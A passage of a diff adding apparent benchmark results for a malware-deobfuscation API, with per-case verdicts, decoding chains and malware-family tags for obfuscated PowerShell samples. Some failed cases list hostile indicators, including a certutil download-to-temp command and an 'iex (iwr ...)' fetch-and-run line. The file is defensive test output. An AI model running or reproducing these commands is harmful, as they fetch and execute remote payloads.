@@ -1,0 +1,1984 @@
+{
+  "api": "http://localhost:8001",
+  "total": 100,
+  "passed": 96,
+  "failed": 4,
+  "false_positives": 1,
+  "false_negatives": 0,
+  "duration_s": 69,
+  "algorithms_covered": [
+    "3DES",
+    "AES-CBC",
+    "AES-GCM",
+    "Base64+GZip+AES-CBC (C2 key)",
+    "Base64+RC4",
+    "ChaCha20-Poly1305",
+    "Compress-Archive",
+    "CustomHex+RC4",
+    "DES",
+    "GPG-asymmetric",
+    "GPG-symmetric",
+    "Get-Process",
+    "Hex+XOR-multi",
+    "Key-generation",
+    "OpenSSL:3DES",
+    "OpenSSL:AES-CBC",
+    "OpenSSL:ChaCha20",
+    "OpenSSL:RC4",
+    "RC4",
+    "RC4+DPAPI",
+    "RijndaelManaged",
+    "XOR-multi",
+    "XOR-single",
+    "certutil-encode",
+    "defender-config",
+    "net-user-add",
+    "robocopy",
+    "schtasks-benign"
+  ],
+  "algorithm_rollup": {
+    "RC4": {
+      "pass": 5,
+      "fail": 0
+    },
+    "AES-CBC": {
+      "pass": 11,
+      "fail": 0
+    },
+    "AES-GCM": {
+      "pass": 5,
+      "fail": 0
+    },
+    "RC4+DPAPI": {
+      "pass": 3,
+      "fail": 0
+    },
+    "RijndaelManaged": {
+      "pass": 4,
+      "fail": 0
+    },
+    "ChaCha20-Poly1305": {
+      "pass": 3,
+      "fail": 0
+    },
+    "DES": {
+      "pass": 2,
+      "fail": 0
+    },
+    "3DES": {
+      "pass": 2,
+      "fail": 0
+    },
+    "OpenSSL:AES-CBC": {
+      "pass": 3,
+      "fail": 0
+    },
+    "OpenSSL:ChaCha20": {
+      "pass": 1,
+      "fail": 0
+    },
+    "OpenSSL:3DES": {
+      "pass": 1,
+      "fail": 0
+    },
+    "OpenSSL:RC4": {
+      "pass": 1,
+      "fail": 0
+    },
+    "GPG-symmetric": {
+      "pass": 3,
+      "fail": 0
+    },
+    "XOR-single": {
+      "pass": 3,
+      "fail": 2
+    },
+    "XOR-multi": {
+      "pass": 30,
+      "fail": 0
+    },
+    "Base64+RC4": {
+      "pass": 3,
+      "fail": 0
+    },
+    "Hex+XOR-multi": {
+      "pass": 2,
+      "fail": 1
+    },
+    "Base64+GZip+AES-CBC (C2 key)": {
+      "pass": 4,
+      "fail": 0
+    },
+    "CustomHex+RC4": {
+      "pass": 2,
+      "fail": 0
+    },
+    "GPG-asymmetric": {
+      "pass": 1,
+      "fail": 0
+    },
+    "Key-generation": {
+      "pass": 1,
+      "fail": 0
+    },
+    "certutil-encode": {
+      "pass": 1,
+      "fail": 0
+    },
+    "defender-config": {
+      "pass": 1,
+      "fail": 0
+    },
+    "Get-Process": {
+      "pass": 1,
+      "fail": 0
+    },
+    "Compress-Archive": {
+      "pass": 1,
+      "fail": 0
+    },
+    "net-user-add": {
+      "pass": 1,
+      "fail": 0
+    },
+    "schtasks-benign": {
+      "pass": 0,
+      "fail": 1
+    },
+    "robocopy": {
+      "pass": 1,
+      "fail": 0
+    }
+  },
+  "results": [
+    {
+      "id": "rc4-inline-ps-0",
+      "algorithm": "RC4",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 3,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "rc4-inline-decrypt",
+        "crypto-detect",
+        "ioc-extract",
+        "family-cobaltstrike"
+      ],
+      "latency_ms": 1163
+    },
+    {
+      "id": "rc4-inline-ps-1",
+      "algorithm": "RC4",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 3,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "rc4-inline-decrypt",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "latency_ms": 1183
+    },
+    {
+      "id": "rc4-inline-ps-2",
+      "algorithm": "RC4",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 3,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "rc4-inline-decrypt",
+        "extract-payload",
+        "crypto-detect",
+        "ioc-extract",
+        "family-emotet"
+      ],
+      "latency_ms": 853
+    },
+    {
+      "id": "rc4-inline-ps-3",
+      "algorithm": "RC4",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 3,
+      "verdict_actual": "suspicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "rc4-inline-decrypt",
+        "crypto-detect",
+        "ioc-extract",
+        "family-cobaltstrike"
+      ],
+      "latency_ms": 201
+    },
+    {
+      "id": "rc4-inline-ps-4",
+      "algorithm": "RC4",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "rc4-inline-decrypt",
+        "crypto-detect",
+        "family-emotet"
+      ],
+      "latency_ms": 197
+    },
+    {
+      "id": "aes-cbc-inline-ps-0",
+      "algorithm": "AES-CBC",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 3,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "base64-decode"
+      ],
+      "latency_ms": 197
+    },
+    {
+      "id": "aes-cbc-inline-ps-1",
+      "algorithm": "AES-CBC",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 3,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "base64-decode"
+      ],
+      "latency_ms": 266
+    },
+    {
+      "id": "aes-cbc-inline-ps-2",
+      "algorithm": "AES-CBC",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 3,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "base64-decode"
+      ],
+      "latency_ms": 198
+    },
+    {
+      "id": "aes-cbc-inline-ps-3",
+      "algorithm": "AES-CBC",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 3,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "base64-decode"
+      ],
+      "latency_ms": 199
+    },
+    {
+      "id": "aes-cbc-inline-ps-4",
+      "algorithm": "AES-CBC",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 3,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "base64-decode"
+      ],
+      "latency_ms": 199
+    },
+    {
+      "id": "aes-gcm-inline-ps-0",
+      "algorithm": "AES-GCM",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 3,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "base64-decode"
+      ],
+      "latency_ms": 219
+    },
+    {
+      "id": "aes-gcm-inline-ps-1",
+      "algorithm": "AES-GCM",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 3,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "base64-decode"
+      ],
+      "latency_ms": 195
+    },
+    {
+      "id": "aes-gcm-inline-ps-2",
+      "algorithm": "AES-GCM",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 3,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "base64-decode"
+      ],
+      "latency_ms": 197
+    },
+    {
+      "id": "aes-gcm-inline-ps-3",
+      "algorithm": "AES-GCM",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 3,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "base64-decode"
+      ],
+      "latency_ms": 197
+    },
+    {
+      "id": "aes-gcm-inline-ps-4",
+      "algorithm": "AES-GCM",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 3,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "base64-decode"
+      ],
+      "latency_ms": 197
+    },
+    {
+      "id": "rc4-dpapi-ps-0",
+      "algorithm": "RC4+DPAPI",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "crypto-detect"
+      ],
+      "latency_ms": 194
+    },
+    {
+      "id": "rc4-dpapi-ps-1",
+      "algorithm": "RC4+DPAPI",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "crypto-detect"
+      ],
+      "latency_ms": 259
+    },
+    {
+      "id": "rc4-dpapi-ps-2",
+      "algorithm": "RC4+DPAPI",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "crypto-detect"
+      ],
+      "latency_ms": 194
+    },
+    {
+      "id": "rijndael-managed-ps-0",
+      "algorithm": "RijndaelManaged",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "crypto-detect",
+        "family-redline"
+      ],
+      "latency_ms": 197
+    },
+    {
+      "id": "rijndael-managed-ps-1",
+      "algorithm": "RijndaelManaged",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "crypto-detect",
+        "family-redline"
+      ],
+      "latency_ms": 194
+    },
+    {
+      "id": "rijndael-managed-ps-2",
+      "algorithm": "RijndaelManaged",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "crypto-detect",
+        "family-redline"
+      ],
+      "latency_ms": 195
+    },
+    {
+      "id": "rijndael-managed-ps-3",
+      "algorithm": "RijndaelManaged",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "crypto-detect",
+        "family-redline"
+      ],
+      "latency_ms": 201
+    },
+    {
+      "id": "chacha20-ps-0",
+      "algorithm": "ChaCha20-Poly1305",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 3,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode"
+      ],
+      "latency_ms": 198
+    },
+    {
+      "id": "chacha20-ps-1",
+      "algorithm": "ChaCha20-Poly1305",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 3,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode"
+      ],
+      "latency_ms": 200
+    },
+    {
+      "id": "chacha20-ps-2",
+      "algorithm": "ChaCha20-Poly1305",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 3,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode"
+      ],
+      "latency_ms": 198
+    },
+    {
+      "id": "des-inline-ps-0",
+      "algorithm": "DES",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 3,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "suspicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "crypto-detect"
+      ],
+      "latency_ms": 193
+    },
+    {
+      "id": "3des-inline-ps-1",
+      "algorithm": "3DES",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 3,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "base64-decode",
+        "crypto-detect",
+        "family-redline"
+      ],
+      "latency_ms": 262
+    },
+    {
+      "id": "des-inline-ps-2",
+      "algorithm": "DES",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 3,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "suspicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "crypto-detect"
+      ],
+      "latency_ms": 195
+    },
+    {
+      "id": "3des-inline-ps-3",
+      "algorithm": "3DES",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 3,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "base64-decode",
+        "crypto-detect",
+        "family-redline"
+      ],
+      "latency_ms": 194
+    },
+    {
+      "id": "openssl-enc-aes-256-cbc-0",
+      "algorithm": "OpenSSL:AES-CBC",
+      "category": "cmd-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "suspicious",
+      "chain": [
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "latency_ms": 1054
+    },
+    {
+      "id": "openssl-enc-aes-128-cbc-1",
+      "algorithm": "OpenSSL:AES-CBC",
+      "category": "cmd-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "suspicious",
+      "chain": [
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator"
+      ],
+      "latency_ms": 1039
+    },
+    {
+      "id": "openssl-enc-chacha20-2",
+      "algorithm": "OpenSSL:ChaCha20",
+      "category": "cmd-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "suspicious",
+      "chain": [
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator"
+      ],
+      "latency_ms": 1027
+    },
+    {
+      "id": "openssl-enc-des3-3",
+      "algorithm": "OpenSSL:3DES",
+      "category": "cmd-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "suspicious",
+      "chain": [
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator"
+      ],
+      "latency_ms": 1042
+    },
+    {
+      "id": "openssl-enc-rc4-4",
+      "algorithm": "OpenSSL:RC4",
+      "category": "cmd-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "suspicious",
+      "chain": [
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator"
+      ],
+      "latency_ms": 1018
+    },
+    {
+      "id": "gpg-symmetric-0",
+      "algorithm": "GPG-symmetric",
+      "category": "cmd-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 1,
+      "verdict_actual": "suspicious",
+      "verdict_expected": "suspicious",
+      "chain": [
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator"
+      ],
+      "latency_ms": 1026
+    },
+    {
+      "id": "gpg-symmetric-1",
+      "algorithm": "GPG-symmetric",
+      "category": "cmd-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "suspicious",
+      "chain": [
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "ioc-extract"
+      ],
+      "latency_ms": 1006
+    },
+    {
+      "id": "gpg-symmetric-2",
+      "algorithm": "GPG-symmetric",
+      "category": "cmd-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "suspicious",
+      "chain": [
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator"
+      ],
+      "latency_ms": 1020
+    },
+    {
+      "id": "xor-single-0",
+      "algorithm": "XOR-single",
+      "category": "ps-crypto",
+      "passed": false,
+      "reasons": [
+        "missing-iocs ['http://c2.io/beacon']"
+      ],
+      "recovered_stages": 1,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "ps-reconstruct"
+      ],
+      "latency_ms": 261
+    },
+    {
+      "id": "xor-single-1",
+      "algorithm": "XOR-single",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "ps-reconstruct",
+        "crypto-detect"
+      ],
+      "latency_ms": 203
+    },
+    {
+      "id": "xor-single-2",
+      "algorithm": "XOR-single",
+      "category": "ps-crypto",
+      "passed": false,
+      "reasons": [
+        "missing-iocs ['certutil -urlcache -f http://m.io/x.exe %tmp%\\\\x.exe']"
+      ],
+      "recovered_stages": 1,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "ps-reconstruct",
+        "crypto-detect"
+      ],
+      "latency_ms": 211
+    },
+    {
+      "id": "xor-single-3",
+      "algorithm": "XOR-single",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "ps-reconstruct",
+        "crypto-detect"
+      ],
+      "latency_ms": 226
+    },
+    {
+      "id": "xor-single-4",
+      "algorithm": "XOR-single",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 3,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "ps-reconstruct",
+        "crypto-detect"
+      ],
+      "latency_ms": 210
+    },
+    {
+      "id": "xor-multi-0",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "extract-payload",
+        "crypto-detect",
+        "ioc-extract",
+        "family-emotet"
+      ],
+      "latency_ms": 891
+    },
+    {
+      "id": "xor-multi-1",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "extract-payload",
+        "crypto-detect"
+      ],
+      "latency_ms": 193
+    },
+    {
+      "id": "xor-multi-2",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "suspicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect"
+      ],
+      "latency_ms": 191
+    },
+    {
+      "id": "xor-multi-3",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "extract-payload",
+        "base64-decode",
+        "crypto-detect"
+      ],
+      "latency_ms": 193
+    },
+    {
+      "id": "xor-multi-4",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key"
+      ],
+      "latency_ms": 191
+    },
+    {
+      "id": "xor-multi-5",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect",
+        "ioc-extract",
+        "family-cobaltstrike"
+      ],
+      "latency_ms": 197
+    },
+    {
+      "id": "b64-rc4-inline-0",
+      "algorithm": "Base64+RC4",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 3,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "rc4-inline-decrypt",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "latency_ms": 891
+    },
+    {
+      "id": "b64-rc4-inline-1",
+      "algorithm": "Base64+RC4",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 3,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "rc4-inline-decrypt",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "latency_ms": 1336
+    },
+    {
+      "id": "b64-rc4-inline-2",
+      "algorithm": "Base64+RC4",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 3,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "rc4-inline-decrypt",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "latency_ms": 743
+    },
+    {
+      "id": "c2-derived-key-0",
+      "algorithm": "AES-CBC",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 0,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "latency_ms": 972
+    },
+    {
+      "id": "c2-derived-key-1",
+      "algorithm": "AES-CBC",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 0,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "crypto-detect",
+        "ioc-extract",
+        "family-cobaltstrike"
+      ],
+      "latency_ms": 1098
+    },
+    {
+      "id": "c2-derived-key-2",
+      "algorithm": "AES-CBC",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 0,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "latency_ms": 1364
+    },
+    {
+      "id": "machineguid-key-0",
+      "algorithm": "AES-CBC",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 0,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base32-decode",
+        "ioc-extract"
+      ],
+      "latency_ms": 204
+    },
+    {
+      "id": "machineguid-key-1",
+      "algorithm": "AES-CBC",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 0,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base32-decode",
+        "ioc-extract"
+      ],
+      "latency_ms": 207
+    },
+    {
+      "id": "machineguid-key-2",
+      "algorithm": "AES-CBC",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 0,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base32-decode",
+        "ioc-extract"
+      ],
+      "latency_ms": 204
+    },
+    {
+      "id": "hex-xor-multi-0",
+      "algorithm": "Hex+XOR-multi",
+      "category": "ps-crypto",
+      "passed": false,
+      "reasons": [
+        "missing-iocs ['iex (iwr http://c2/x.ps1)']"
+      ],
+      "recovered_stages": 4,
+      "total_recoverable": 4,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "ps-reconstruct"
+      ],
+      "latency_ms": 206
+    },
+    {
+      "id": "hex-xor-multi-1",
